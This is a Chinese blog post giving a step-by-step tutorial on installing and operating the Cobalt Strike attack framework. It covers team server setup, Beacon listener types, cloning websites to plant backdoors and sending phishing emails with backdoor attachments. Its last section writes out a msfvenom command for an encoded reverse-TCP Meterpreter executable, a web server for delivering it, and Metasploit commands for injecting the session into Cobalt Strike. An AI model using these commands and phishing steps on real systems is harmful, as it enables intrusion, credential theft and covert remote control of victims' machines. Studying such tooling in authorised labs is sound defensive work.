<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Clbalt Strike安装及使用详解 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Clbalt Strike安装及使用详解" />
<meta property="og:description" content="Clbalt Strike安装及使用详解 1 Clbalt Strike的特点2 Clbalt Strike 安装与环境配置（kali）2.1 其他linux系统安装jdk1 升级APT2 使用 APT 安装 OpenJDK 11：3 将 OpenJDK 11 设置为默认 Java 程序： 2.2 开始安装3 Clbalt Strike 安装与环境配置（Windows）3.1 下载Windows x64 OpenJDK：https://jdk.java.net/archive/3.2 环境变量配置 4 Cobalt Strike下载地址5 Cobalt Strike团队服务器启动6 Cobalt Strike客户端连接到团队服务（Linux）7 Cobalt Strike客户端连接团队服务（Windows）8 Cobalt Strik功能介绍9 创建一个监控**9.1 监控器链接方式简介****9.2 Beacon分类**9.2.1 DNS Beacon 9.2.2 HTTP 和 HTTPS Beacon9.2.3 SMB Beacon9.2.3 TCP Beacon 10 Cobalt Strik 目标主机信息收集11 Cobalt Strik 克隆网页并挂马1 配置网站克隆 2 挂马12 Cobalt Strik 邮件钓鱼12 将MSF会话注入Cobalt Strik监控1 环境准备：2 配置MSF创建监听3 使用CS进行监控 1 Clbalt Strike的特点 Clbalt Strike简称CS 用于团队作战使用，由一个服务端和多个客户端组成，能让多个攻击者这在一个团队服务器上共享目标资源和信息" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/fac2f41370d4d38cd35cdcd81311a8f0/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-19T16:48:05+08:00" />
<meta property="article:modified_time" content="2022-10-19T16:48:05+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Clbalt Strike安装及使用详解</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>Clbalt Strike安装及使用详解</h4> 
 <ul><li><a href="#1_Clbalt_Strike_2" rel="nofollow">1 Clbalt Strike的特点</a></li><li><a href="#2_Clbalt_Strike_kali_20" rel="nofollow">2 Clbalt Strike 安装与环境配置（kali）</a></li><li><ul><li><a href="#21_linuxjdk_27" rel="nofollow">2.1 其他linux系统安装jdk</a></li><li><ul><li><ul><li><a href="#1_APT_31" rel="nofollow">1 升级APT</a></li><li><a href="#2__APT__OpenJDK_11_39" rel="nofollow">2 使用 APT 安装 OpenJDK 11：</a></li><li><a href="#3__OpenJDK_11__Java__47" rel="nofollow">3 将 OpenJDK 11 设置为默认 Java 程序：</a></li></ul> 
   </li></ul> 
  </li></ul> 
  </li><li><a href="#22__55" rel="nofollow">2.2 开始安装</a></li><li><a href="#3_Clbalt_Strike_Windows_77" rel="nofollow">3 Clbalt Strike 安装与环境配置（Windows）</a></li><li><ul><li><a href="#31_Windows_x64_OpenJDKhttpsjdkjavanetarchive_79" rel="nofollow">3.1 下载Windows x64 OpenJDK：https://jdk.java.net/archive/</a></li><li><a href="#32__89" rel="nofollow">3.2 环境变量配置</a></li></ul> 
  </li><li><a href="#4_Cobalt_Strike_99" rel="nofollow">4 Cobalt Strike下载地址</a></li><li><a href="#5_Cobalt_Strike_103" rel="nofollow">5 Cobalt Strike团队服务器启动</a></li><li><a href="#6_Cobalt_StrikeLinux_119" rel="nofollow">6 Cobalt Strike客户端连接到团队服务（Linux）</a></li><li><a href="#7_Cobalt_StrikeWindows_151" rel="nofollow">7 Cobalt Strike客户端连接团队服务（Windows）</a></li><li><a href="#8_Cobalt_Strik_181" rel="nofollow">8 Cobalt Strik功能介绍</a></li><li><a href="#9___223" rel="nofollow">9 创建一个监控</a></li><li><ul><li><a href="#91__225" rel="nofollow">**9.1 监控器链接方式简介**</a></li><li><a href="#92_Beacon_239" rel="nofollow">**9.2 Beacon分类**</a></li><li><a href="#921_DNS_Beacon_248" rel="nofollow">9.2.1 DNS Beacon</a></li></ul> 
  </li><li><a href="#922__HTTP__HTTPS_Beacon_264" rel="nofollow">9.2.2 HTTP 和 HTTPS Beacon</a></li><li><a href="#923__SMB_Beacon_272" rel="nofollow">9.2.3 SMB Beacon</a></li><li><ul><li><a href="#923__TCP_Beacon_280" rel="nofollow">9.2.3 TCP Beacon</a></li></ul> 
  </li><li><a href="#10__Cobalt_Strik__292" rel="nofollow">10 Cobalt Strik 目标主机信息收集</a></li><li><a href="#11_Cobalt_Strik__312" rel="nofollow">11 Cobalt Strik 克隆网页并挂马</a></li><li><ul><li><a href="#1__318" rel="nofollow">1 配置网站克隆</a></li></ul> 
  </li><li><a href="#2__334" rel="nofollow">2 挂马</a></li><li><a href="#12__Cobalt_Strik__350" rel="nofollow">12 Cobalt Strik 邮件钓鱼</a></li><li><a href="#12_MSFCobalt_Strik_386" rel="nofollow">12 将MSF会话注入Cobalt Strik监控</a></li><li><ul><li><a href="#1__388" rel="nofollow">1 环境准备：</a></li><li><a href="#2_MSF_396" rel="nofollow">2 配置MSF创建监听</a></li><li><a href="#3_CS_436" rel="nofollow">3 使用CS进行监控</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h2><a id="1_Clbalt_Strike_2"></a>1 Clbalt Strike的特点</h2> 
<p>Clbalt Strike简称CS 用于团队作战使用，由一个服务端和多个客户端组成，能让多个攻击者这在一个团队服务器上共享目标资源和信息</p> 
<p>CS有很多Payload的生成模块 可以生成EXE，dll，vbs，图片马，bad，vba宏，和shellcode等等</p> 
<p>CS还支持钓鱼攻击，可自动化挂马链接生成</p> 
<p>CS还有很多后渗透模块，浏览器代理模块，端口转发 扫描，提权，socks代理 ，令牌窃取等</p> 
<p>Clbalt Strike 分为服务端和客户端</p> 
<p>服务端 可以部署在远程服务器下或者 部署在kaili里</p> 
<p>客户端 可以部署到本地 支持linux和windows系统</p> 
<p><img src="https://images2.imgbox.com/b1/cf/qwkxorn6_o.png" alt="16478585820453010889ffy"></p> 
<h2><a id="2_Clbalt_Strike_kali_20"></a>2 Clbalt Strike 安装与环境配置（kali）</h2> 
<p>准备环境 ：</p> 
<p>CS4，4（官网自行下载）<a href="https://www.cobaltstrike.com/" rel="nofollow">https://www.cobaltstrike.com/</a><br> jdk11（如果使用kali 则不需要另外安装jdk）</p> 
<h3><a id="21_linuxjdk_27"></a>2.1 其他linux系统安装jdk</h3> 
<p>使用 APT 安装 OpenJDK 11：</p> 
<h5><a id="1_APT_31"></a>1 升级APT</h5> 
<p>sudo apt-get update</p> 
<p>或</p> 
<p>apt-get update</p> 
<h5><a id="2__APT__OpenJDK_11_39"></a>2 使用 APT 安装 OpenJDK 11：</h5> 
<p>sudo apt-get install openjdk-11-jdk</p> 
<p>或</p> 
<p>apt-get install openjdk-11-jdk</p> 
<h5><a id="3__OpenJDK_11__Java__47"></a>3 将 OpenJDK 11 设置为默认 Java 程序：</h5> 
<p>sudo update-java-alternatives -s java-1.11.0-openjdk-amd64</p> 
<p>或</p> 
<p>update-java-alternatives -s java-1.11.0-openjdk-amd64</p> 
<h2><a id="22__55"></a>2.2 开始安装</h2> 
<p>Clbalt Strike 4.4 安装包</p> 
<p><img src="https://images2.imgbox.com/ff/4f/fuh7YEIg_o.png" alt="image.png">将CS4.4解压</p> 
<p><img src="https://images2.imgbox.com/c6/0a/fklwFaYG_o.png" alt="image.png"></p> 
<p>创建一个目录去存解压文件</p> 
<p><img src="https://images2.imgbox.com/86/eb/Xm7Io1ba_o.png" alt="image.png"></p> 
<p><img src="https://images2.imgbox.com/f7/58/ct5qPE0B_o.png" alt="image.png"></p> 
<p>给服务的启动文件赋 777权限</p> 
<p>进入终端找到CS4目录 然后 chmod 777 teamserver （注意我这边是使用root终端操作的）</p> 
<p><img src="https://images2.imgbox.com/d4/19/eb4vlmd3_o.png" alt="image.png"></p> 
<p>完成环境配置</p> 
<h2><a id="3_Clbalt_Strike_Windows_77"></a>3 Clbalt Strike 安装与环境配置（Windows）</h2> 
<h3><a id="31_Windows_x64_OpenJDKhttpsjdkjavanetarchive_79"></a>3.1 下载Windows x64 OpenJDK：https://jdk.java.net/archive/</h3> 
<p><img src="https://images2.imgbox.com/44/ed/inKdvsG9_o.png" alt="image.png"></p> 
<p>然后解压并找个位置放这个 jdk-11.0.1 注意路径最好不要有中文。</p> 
<p><img src="https://images2.imgbox.com/19/6e/MjJKV0Xh_o.png" alt="image.png"></p> 
<p>我这边把jdk-11.0.1放到E盘根目录</p> 
<h3><a id="32__89"></a>3.2 环境变量配置</h3> 
<p><img src="https://images2.imgbox.com/2c/b3/pINgxzjC_o.png" alt="image.png"></p> 
<p><img src="https://images2.imgbox.com/e7/34/p4Om0Y3L_o.png" alt="image.png"></p> 
<p>进入CMD 输入 java -version</p> 
<p><img src="https://images2.imgbox.com/d5/8a/alYnFbii_o.png" alt="image.png"></p> 
<h2><a id="4_Cobalt_Strike_99"></a>4 Cobalt Strike下载地址</h2> 
<p>官网地址 <a href="https://www.cobaltstrike.com/" rel="nofollow">https://www.cobaltstrike.com/</a></p> 
<h2><a id="5_Cobalt_Strike_103"></a>5 Cobalt Strike团队服务器启动</h2> 
<p>打开root终端进入CS 目录</p> 
<p>在终端中输入： ./teamserver 192.168.3.56 123456</p> 
<p>解释</p> 
<p><img src="https://images2.imgbox.com/4f/6a/z1ICgpY6_o.png" alt="image.png"></p> 
<p>看到这个提示证明已经启动完成</p> 
<p><img src="https://images2.imgbox.com/c0/30/TQpFXCBr_o.png" alt="image.png"></p> 
<p>到此CS服务器启动完成了</p> 
<h2><a id="6_Cobalt_StrikeLinux_119"></a>6 Cobalt Strike客户端连接到团队服务（Linux）</h2> 
<p>进入CS目录</p> 
<p><img src="https://images2.imgbox.com/26/42/eRqqqLd7_o.png" alt="image.png"></p> 
<p>然后输入 ./cobaltstrike 即可</p> 
<p><img src="https://images2.imgbox.com/05/de/BSQqspwM_o.png" alt="image.png"></p> 
<p>第一次使用CS会提示权限不够</p> 
<p><img src="https://images2.imgbox.com/d8/a4/TlT5IeLV_o.png" alt="image.png"></p> 
<p>我们可以直接给cobaltstrike 赋777权限,然后在启动即课</p> 
<p>终端内输入 chmod 777 cobaltstrike</p> 
<p><img src="https://images2.imgbox.com/6c/2f/9rqtGc3r_o.png" alt="image.png"></p> 
<p>启动CS完成后根据服务器配置输入IP ，端口，用户名，密码</p> 
<p><img src="https://images2.imgbox.com/7a/31/aZ380qpQ_o.png" alt="image.png"></p> 
<p>看到提示点击 Yes即可</p> 
<p><img src="https://images2.imgbox.com/41/42/YzS0v6sL_o.png" alt="image.png"></p> 
<p>稍等片刻即可启动完成 （如果电脑较卡启动时间会稍微有点长多等一下）</p> 
<p><img src="https://images2.imgbox.com/7b/30/DzzDniO4_o.png" alt="image.png"></p> 
<h2><a id="7_Cobalt_StrikeWindows_151"></a>7 Cobalt Strike客户端连接团队服务（Windows）</h2> 
<p><strong>注意Cobalt Strike这款软件最好在虚拟机内执行避免后门反噬主机</strong></p> 
<p>解压CS安装包</p> 
<p><img src="https://images2.imgbox.com/66/92/weO2zH6Z_o.png" alt="image.png"></p> 
<p>启动方法1 直接管理员方式执行 cobaltstrike.bat</p> 
<p>启动方法2 在CMD中运行，注意CMD也要管理员权限</p> 
<p><img src="https://images2.imgbox.com/ac/1b/9qNSUhJ0_o.png" alt="image.png"></p> 
<p><img src="https://images2.imgbox.com/c7/4a/JNYUg2cm_o.png" alt="image.png"></p> 
<p><img src="https://images2.imgbox.com/c2/75/iDiK2lFa_o.png" alt="image.png"></p> 
<p>启动CS完成后根据服务器配置输入IP ，端口，用户名，密码</p> 
<p><img src="https://images2.imgbox.com/c8/ba/HJZcxBjg_o.png" alt="image.png"></p> 
<p>看到服务器指纹确认点Yes 服务器指纹应与服务启动时一样</p> 
<p><img src="https://images2.imgbox.com/e4/d6/IENna4sW_o.png" alt="image.png"></p> 
<p><img src="https://images2.imgbox.com/1d/68/mZDDeNCI_o.png" alt="image.png"></p> 
<hr> 
<h2><a id="8_Cobalt_Strik_181"></a>8 Cobalt Strik功能介绍</h2> 
<p><img src="https://images2.imgbox.com/61/36/Ib5Zu94o_o.png" alt="image.png"></p> 
<p>图标栏功能说明</p> 
<p>1 添加新的 Cobalt Strik 团队服务器</p> 
<p>2 删除当前 Cobalt Strik 团队服务器</p> 
<p>3 新建一个监听器</p> 
<p>4 切换图形会话按钮</p> 
<p>5 切换列表会话按钮</p> 
<p>6 以列表方式显示目标</p> 
<p>7 密码凭证栏按钮</p> 
<p>8 下载文件列表</p> 
<p>9 键盘记录表</p> 
<p>10 屏幕截图表</p> 
<p>11 生成Windows下可执行木马</p> 
<p>12 生成java签名applet攻击</p> 
<p>13 生成office 宏攻击</p> 
<p>14 生成powershell后门</p> 
<p>15 文件托管按钮</p> 
<p>16 管理web站点</p> 
<p>17 帮助文档</p> 
<p>18 关于</p> 
<h2><a id="9___223"></a>9 创建一个监控</h2> 
<h3><a id="91__225"></a><strong>9.1 监控器链接方式简介</strong></h3> 
<p>beacon是cs内置的监听器，当我们在目标机器上成功执行Payload后，会返回一个shell发送到cs上。</p> 
<p>foreign主要是提供给cs外的工具使用的监听器，例如派生出来msf的shell来进行后渗透。</p> 
<p>External C2 是 cs引入的一种规范（或者框架），黑客可以利用这个功能拓展C2通信渠道，而不局限于默认提供的 http，https，dns，smb tcp 通道。大家可以参考 <a href="https://www.cobaltstrike.com/downloads/externalc2spec.pdf" rel="nofollow">此处</a> 下载完整的规范说明。</p> 
<p>简而言之， 用户可以使用这个框架来开发各种组件，包括如下组件：</p> 
<ul><li>第三方控制端（Controller）：负责连接 Cobalt Strike TeamServer，并且能够使用自定义的 C2 通道与目标主机上的第三方客户端（Client）通信。</li><li>第三方客户端（Client）：使用自定义C2通道与第三 Controller 通信，将命令转发至 SMB Beacon。</li><li>SMB Beacon：在受害者主机上执行的标准 beacon。</li></ul> 
<h3><a id="92_Beacon_239"></a><strong>9.2 Beacon分类</strong></h3> 
<p><strong>Beacon是Cobalt Strike运行在目标主机上的payload，Beacons是在隐蔽信道上给我们提供服务，用于长期控制受感染主机</strong> 。它的工作方式与Metasploit类似。在实际渗透过程中，我们可以将其 <strong>嵌入到可执行文件</strong> 、<strong>添加到Word文档</strong>或者通过<strong>利用主机漏洞</strong>来传递Beacon。</p> 
<ol><li>DNS Beacon</li><li>HTTP 和 HTTPS Beacon</li><li>SMB Beacon</li><li>TCP Beacon</li></ol> 
<h3><a id="921_DNS_Beacon_248"></a>9.2.1 DNS Beacon</h3> 
<p>DNS Beacon，就是使用DNS请求将Beacon返回。DNS 请求用于解析由你的 CS 团队服务器</p> 
<p>DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务</p> 
<p>注意：</p> 
<p>在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式</p> 
<p>DNS Beacon优点：</p> 
<p>拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。</p> 
<p><img src="https://images2.imgbox.com/d2/7f/AKd2O5pX_o.png" alt="image.png"></p> 
<h2><a id="922__HTTP__HTTPS_Beacon_264"></a>9.2.2 HTTP 和 HTTPS Beacon</h2> 
<p>HTTP Beacon 利用http请求来进行通信来向受害主机传达命令，达到控制对方主机的目的。缺点是明文传输。</p> 
<p>HTTPS Beacon 增加了加密传输，其余跟http完全相同。</p> 
<p><img src="https://images2.imgbox.com/30/97/PXw3fUZY_o.png" alt="image.png"></p> 
<h2><a id="923__SMB_Beacon_272"></a>9.2.3 SMB Beacon</h2> 
<p><strong>官网的解释为</strong> ：<em>SMB Beacon 使用命名管道通过父 Beacon 进行通信，这种点对点通信借助 Beacons 在同一台主机上实现，它同样也适用于外部的互联网。Windows 当中借助在 SMB 协议中封装命名管道进行通信，因此，命名为 SMB Beacon。</em></p> 
<p>以上的说法，其实就是将 <code>Payload</code> 运行（注入）后，创建了自定义命名管道（作服务端），等待连接即可。</p> 
<p><img src="https://images2.imgbox.com/27/ac/PDnKgSv6_o.png" alt="image.png"></p> 
<h3><a id="923__TCP_Beacon_280"></a>9.2.3 TCP Beacon</h3> 
<p>TCP Beacon和SMB Beacon类似只不过TCP Beacon不是使用SMB与父Beacon进行通信而是使用TCP socket进行通信，cs4.0之后，这个技术就不适合做第一个木马使用，因为他的流量都是明文的，容易被发现但是这个技术，很适合在内网穿透的时候去使用，在内网穿透的时候一般只能使用tcp beacon去生成木马。</p> 
<p>点击<img src="https://images2.imgbox.com/44/2a/IRGIimWq_o.png" alt="image.png">或 点击监听器</p> 
<p><img src="https://images2.imgbox.com/80/12/mrDIwgRS_o.png" alt="image.png"></p> 
<p><img src="https://images2.imgbox.com/07/dc/IJfC5kzQ_o.png" alt="image.png"></p> 
<p><img src="https://images2.imgbox.com/2b/e2/wjgKj79O_o.png" alt="image.png"></p> 
<h2><a id="10__Cobalt_Strik__292"></a>10 Cobalt Strik 目标主机信息收集</h2> 
<p>Cobalt Strik内置信息收集模块 可以收集 目标主机的操作系统版本 系统位数 浏览器 版本 位数</p> 
<p>方便攻击者针对性攻击</p> 
<p><img src="https://images2.imgbox.com/50/76/9z111DNk_o.png" alt="image.png"></p> 
<p>配置信息收集 有4个参数可以设置 分别为 本地URL 本地Host 本地端口 跳转URL</p> 
<p>本地URL 配置的参数是访问ip后面的参数</p> 
<p>本地Host 是当前Cobalt Strik服务器的内网或公网IP</p> 
<p>本地端口 默认是80 如果80被占用了就需要设置其他的 如 81 82 83 都可以</p> 
<p>跳转URL 默认可不设置跳转</p> 
<p><img src="https://images2.imgbox.com/5d/5f/IciqxXK7_o.png" alt="image.png"></p> 
<h2><a id="11_Cobalt_Strik__312"></a>11 Cobalt Strik 克隆网页并挂马</h2> 
<p>克隆网页</p> 
<p><img src="https://images2.imgbox.com/2f/fe/c9CtHQdp_o.png" alt="image.png"></p> 
<h3><a id="1__318"></a>1 配置网站克隆</h3> 
<p>克隆URL 输入http网站链接</p> 
<p>本地URL 配置的参数是访问ip后面的参数</p> 
<p>本地Host 是当前Cobalt Strik服务器的内网或公网IP</p> 
<p>本地端口 默认是80 如果80被占用了就需要设置其他的 如 81 82 83 都可以</p> 
<p>攻击地址 ： 默认不配置</p> 
<p><img src="https://images2.imgbox.com/dd/18/HTCeEnPL_o.png" alt="image.png"></p> 
<p>配置完成后访问 本地host地址</p> 
<h2><a id="2__334"></a>2 挂马</h2> 
<p><img src="https://images2.imgbox.com/67/70/r5bQYi7A_o.png" alt="image.png"></p> 
<p>克隆URL 输入http网站链接</p> 
<p>本地URL 配置的参数是访问ip后面的参数</p> 
<p>本地Host 是当前Cobalt Strik服务器的内网或公网IP</p> 
<p>本地端口 默认是80 如果80被占用了就需要设置其他的 如 81 82 83 都可以</p> 
<p>攻击地址 ： 选择一个已经配置好的后面下载链接 <strong>这个需要提前配·后门具体看视频</strong></p> 
<p>配置完成后访问 本地host地址+ 参数 mb</p> 
<h2><a id="12__Cobalt_Strik__350"></a>12 Cobalt Strik 邮件钓鱼</h2> 
<p>1 准备一个邮箱用于发送邮件</p> 
<p>这边拿QQ邮箱为例 点击设置然后点击 账户</p> 
<p><img src="https://images2.imgbox.com/8a/80/Nw3BPZHB_o.png" alt="image.png"></p> 
<p>找到 IMAP/SMTP服务 点击开启服务 获取 授权码 （获取后把这个授权码先记录下来）</p> 
<p><img src="https://images2.imgbox.com/72/32/ITrhMZPK_o.png" alt="image.png"></p> 
<p>然后回到CS中 进入邮件钓鱼</p> 
<p><img src="https://images2.imgbox.com/96/17/uXLuaHhp_o.png" alt="image.png"></p> 
<p>邮件钓鱼配置参数如下</p> 
<p>目标 ：这里指的是接收邮件的号码</p> 
<p>模板：邮件的格式个内容</p> 
<p>附件： 可以加入后门程序或其他 或者不加</p> 
<p>嵌入URL : 可以选择配置好的网站放进去</p> 
<p>邮件服务器：</p> 
<p><img src="https://images2.imgbox.com/38/f7/CEG5mwBs_o.png" alt="image.png"></p> 
<p>退信通知邮箱 可以填写任意可接受邮件的邮箱</p> 
<p><img src="https://images2.imgbox.com/c8/09/qoIcL4dv_o.png" alt="image.png"></p> 
<p>所有参数配置完成后 点击 Send 发送邮件即可</p> 
<h2><a id="12_MSFCobalt_Strik_386"></a>12 将MSF会话注入Cobalt Strik监控</h2> 
<h3><a id="1__388"></a>1 环境准备：</h3> 
<p>1 kali操作系统</p> 
<p>2 Cobalt Strik 服务端和客户端</p> 
<p>3 一个在MSF下拿到权限的靶机</p> 
<h3><a id="2_MSF_396"></a>2 配置MSF创建监听</h3> 
<p>2.1 使用msf创建后门</p> 
<p>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.150 LPORT=4444 -e x86/shikata_ga_nai -b ‘\x00\x0a\xff’ -i 10 -f exe -o payload.exe</p> 
<p>2.2 使用python创建一个web服务 然后使用靶机下载</p> 
<p>python3 -m http.server 80</p> 
<p>2.3 配置监控并获取meterpreter</p> 
<p>启动msf</p> 
<blockquote> 
 <p>msfconsole</p> 
</blockquote> 
<p>创建监控</p> 
<p>use exploit/multi/handler</p> 
<p>加载payload</p> 
<p>set payload windows/meterpreter/reverse_tcp</p> 
<p>配置监控参数</p> 
<p>show options</p> 
<p>set lhost 监控IP</p> 
<p>set lport 监控端口</p> 
<p>run 执行</p> 
<p>去靶机执行后门程序 等待返回 meterpreter</p> 
<p>2.4 后台当前session</p> 
<p>background</p> 
<h3><a id="3_CS_436"></a>3 使用CS进行监控</h3> 
<p>1 加载MSF的payload 注入功能</p> 
<p>use exploit/windows/local/payload_inject</p> 
<p>2 设置payload</p> 
<p>set payload windows/meterpreter/reverse_http</p> 
<p>3 查看配置参数</p> 
<p>show options</p> 
<p>set lhost 10.0.0.36</p> 
<p>设置cs服务器地址</p> 
<p>4 set lport 4567</p> 
<p>设置cs监听端口</p> 
<p>5 set session 1</p> 
<p>设置监控会话</p> 
<p>6 set disablepayloadhander true</p> 
<p>设置当前msf不接受监听数据</p> 
<p>7 run</p> 
<p>执行设置</p> 
<p>4 CS开始实战操作</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/7ab627628d5a9212e60e5983ae522872/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">MSF使用详解</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/9bbc6ab4b17e9144bfb409152cba0609/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">用django写端口</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>